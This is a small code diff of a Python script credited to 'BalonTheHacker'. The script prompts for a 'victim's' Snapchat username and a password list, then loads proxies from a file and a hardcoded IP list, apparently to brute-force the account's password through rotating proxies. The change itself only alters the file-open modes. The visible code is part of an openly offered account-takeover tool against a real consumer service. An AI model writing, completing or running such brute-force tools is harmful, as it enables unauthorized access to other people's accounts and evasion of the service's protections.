@@ -32,7 +32,7 @@ by BalonTheHacker
 snap_name = input("What is the victims snapchat username? ")
 password_list = input("What is the path to the password list? ")
 try:
-    password_list = open(password_list).readlines()
+    password_list = open(password_list, "r+").readlines()
 except:
     print("path invalid")
     quit()
@@ -41,7 +41,7 @@ number_of_threads = input("How many threads would you like to run? (Recommended 
 dir_path = os.path.dirname(os.path.realpath(__file__))
 #Connecting to a proxy with urllib3
 print("Connecting to Proxy")
-proxy_list = open(dir_path + "/proxies.txt", 'r').readlines()
+proxy_list = open(dir_path + "/proxies.txt", 'r+').readlines()
 
 proxies1 = ['52.194.26.48:8080',
 '87.244.176.213:53545']
